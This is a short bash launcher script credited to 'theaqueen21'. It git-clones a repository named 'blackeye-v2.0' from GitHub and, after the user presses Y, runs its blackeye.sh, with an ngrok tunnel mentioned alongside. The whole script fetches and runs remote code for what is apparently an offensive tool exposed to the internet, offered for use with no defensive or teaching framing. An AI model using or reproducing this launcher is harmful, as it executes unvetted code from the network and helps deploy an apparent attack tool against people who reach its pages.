#!/bin/bash
FINDUSER="${SUDO_USER:-${USER}}"
echo "Author: theaqueen21"
echo "							"
echo "Downloading blackeye2.0"
echo "							
							"
echo "ngrok setup has started in another terminal tab, after this setup simply switch tabs to complete the process"
echo "
							"							
if [ "$FINDUSER" == "root" ];then
cd /$FINDUSER
git clone "https://github.com/bhikandeshmukh/blackeye-v2.0"
echo "
							"
sleep 2							
while true; do
read -rsn1 input_root
echo "press Y to run blackeye"
if [ "$input_root" = "Y" ];then
cd /$FINDUSER/blackeye-v2.0
sleep 0.2
bash blackeye.sh
fi
done
else
cd /home/$FINDUSER
git clone "https://github.com/bhikandeshmukh/blackeye-v2.0"
sleep 2
echo "
							"
echo "press Y to run blackeye"	
while true; do						
read -rsn1 input_user
if [ "$input_user" = "Y" ];then
cd /home/$FINDUSER/blackeye-v2.0
bash blackeye.sh
fi
done
fi
